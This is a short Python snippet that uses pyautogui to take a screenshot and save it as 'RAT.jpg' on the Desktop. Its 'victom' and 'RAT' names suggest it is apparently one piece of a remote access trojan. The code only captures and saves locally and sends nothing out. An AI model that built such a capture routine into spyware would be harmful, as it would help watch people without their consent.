import pyautogui
import os

def victomscreenshot():


      desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop\\')
      victom_Screenshot = pyautogui.screenshot()
      victom_Screenshot.save(desktop + "RAT.jpg")
